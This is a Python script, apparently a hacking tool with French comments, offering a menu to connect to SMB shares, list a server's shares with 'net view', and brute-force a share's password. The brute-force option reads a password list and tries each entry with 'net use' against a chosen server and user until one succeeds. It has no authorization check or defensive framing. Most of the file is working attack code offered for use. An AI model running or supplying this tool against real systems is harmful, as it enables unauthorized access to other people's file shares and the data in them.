import os
import sys
import subprocess
from colorama import Fore, Style, init

# Initialisation de Colorama
init(autoreset=True)

# Couleurs pour le menu
CYAN = Fore.CYAN
BLUE = Fore.BLUE
RED = Fore.RED
RESET = Style.RESET_ALL

# Fonction pour afficher le menu
def afficher_menu():
    os.system('cls' if os.name == 'nt' else 'clear')  # Nettoie le terminal
    print(f"{CYAN}{'='*40}{RESET}")
    print(f"{BLUE}      Menu de Connexion SMB       {RESET}")
    print(f"{CYAN}{'='*40}{RESET}")
    print(f"{CYAN}[1] {RESET}Se connecter à un partage SMB")
    print(f"{CYAN}[2] {RESET}Lister les partages SMB ouverts")
    print(f"{CYAN}[3] {RESET}Bruteforce d'un partage SMB")
    print(f"{CYAN}[4] {RESET}Quitter")
    print(f"{CYAN}{'-'*40}{RESET}")

# Fonction pour afficher les partages SMB ouverts
def lister_partages_smb(serveur):
    try:
        print(f"{CYAN}[INFO] {RESET}Récupération des partages SMB de {serveur}...")
        
        # Commande pour lister les partages SMB
        commande = ["net", "view", f"\\\\{serveur}"]
        result = subprocess.run(commande, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            # Amélioration de l'affichage des partages SMB
            print(f"{CYAN}[INFO] {RESET}Partages SMB disponibles sur {serveur} :")
            print(f"{CYAN}{'-'*50}{RESET}")
            print(f"{'Nom du partage':<20}{'Type':<10}{'Commentaire':<20}")
            print(f"{CYAN}{'-'*50}{RESET}")
            
            # Extraction des lignes de résultat
            lignes = result.stdout.splitlines()
            for ligne in lignes[3:]:  # Ignore les premières lignes qui ne sont pas des partages
                if ligne.strip():  # Ignore les lignes vides
                    parts = ligne.split()
                    print(f"{parts[0]:<20}{'Disk':<10}{'Aucun':<20}")  # Affiche le nom, le type et un commentaire générique
            print(f"{CYAN}{'-'*50}{RESET}")
        else:
            print(f"{RED}[ERREUR] {RESET}{result.stderr}")
    except Exception as e:
        print(f"{RED}[ERREUR] {RESET}Erreur lors de la récupération des partages SMB : {e}")

# Fonction pour bruteforcer un partage SMB
def bruteforce_smb(serveur, partage, utilisateur, liste_mots_de_passe):
    def essayer_mot_de_passe(mot_de_passe):
        try:
            print(f"{CYAN}[INFO] {RESET}Tentative avec le mot de passe : {mot_de_passe}")
            commande = [
                "net", "use", f"\\\\{serveur}\\{partage}", mot_de_passe, "/user:", utilisateur
            ]
            result = subprocess.run(commande, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            if result.returncode == 0:
                print(f"{BLUE}[SUCCÈS] {RESET}Connexion réussie avec le mot de passe : {mot_de_passe}")
                return True
            else:
                print(f"{RED}[ÉCHEC] {RESET}Échec avec le mot de passe : {mot_de_passe}")
                return False
        except Exception as e:
            print(f"{RED}[ERREUR] {RESET}Erreur lors de la tentative : {e}")
            return False

    print(f"{CYAN}[INFO] {RESET}Démarrage du bruteforce sur {serveur}\\{partage}...")
    for mot_de_passe in liste_mots_de_passe:
        if essayer_mot_de_passe(mot_de_passe):
            break

# Fonction pour se connecter à un partage SMB
def connexion_smb(serveur, partage, utilisateur, mot_de_passe):
    try:
        print(f"{CYAN}[INFO] {RESET}Tentative de connexion...")
        
        # Commande de connexion SMB
        commande = [
            "net", "use", f"\\\\{serveur}\\{partage}", mot_de_passe, "/user:", utilisateur
        ]
        result = subprocess.run(commande, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            print(f"{BLUE}[SUCCÈS] {RESET}Connexion à \\{serveur}\{partage} réussie !")
        else:
            print(f"{RED}[ERREUR] {RESET}{result.stderr}")
    except Exception as e:
        print(f"{RED}[ERREUR] {RESET}Impossible de se connecter : {e}")

def main():
    while True:
        afficher_menu()
        choix = input(f"{CYAN}[CHOIX] {RESET}Entrez une option : ")

        if choix == '1':
            serveur = input(f"{BLUE}[Entrée] {RESET}Adresse du serveur SMB : ")
            partage = input(f"{BLUE}[Entrée] {RESET}Nom du partage : ")
            utilisateur = input(f"{BLUE}[Entrée] {RESET}Nom d'utilisateur : ")
            mot_de_passe = input(f"{BLUE}[Entrée] {RESET}Mot de passe : ")

            connexion_smb(serveur, partage, utilisateur, mot_de_passe)
            input(f"{CYAN}[INFO] {RESET}Appuyez sur Entrée pour revenir au menu...")

        elif choix == '2':
            serveur = input(f"{BLUE}[Entrée] {RESET}Adresse du serveur SMB : ")
            lister_partages_smb(serveur)
            input(f"{CYAN}[INFO] {RESET}Appuyez sur Entrée pour revenir au menu...")

        elif choix == '3':
            serveur = input(f"{BLUE}[Entrée] {RESET}Adresse du serveur SMB : ")
            partage = input(f"{BLUE}[Entrée] {RESET}Nom du partage : ")
            utilisateur = input(f"{BLUE}[Entrée] {RESET}Nom d'utilisateur : ")
            fichier_mots_de_passe = input(f"{BLUE}[Entrée] {RESET}Chemin du fichier de mots de passe : ")

            # Lire les mots de passe depuis le fichier
            try:
                with open(fichier_mots_de_passe, 'r') as f:
                    liste_mots_de_passe = f.read().splitlines()
                bruteforce_smb(serveur, partage, utilisateur, liste_mots_de_passe)
            except FileNotFoundError:
                print(f"{RED}[ERREUR] {RESET}Fichier de mots de passe non trouvé.")
            
            input(f"{CYAN}[INFO] {RESET}Appuyez sur Entrée pour revenir au menu...")

        elif choix == '4':
            print(f"{CYAN}[INFO] {RESET}Au revoir !")
            sys.exit()
        else:
            print(f"{RED}[ERREUR] {RESET}Option invalide, veuillez réessayer.")

if __name__ == "__main__":
    main()
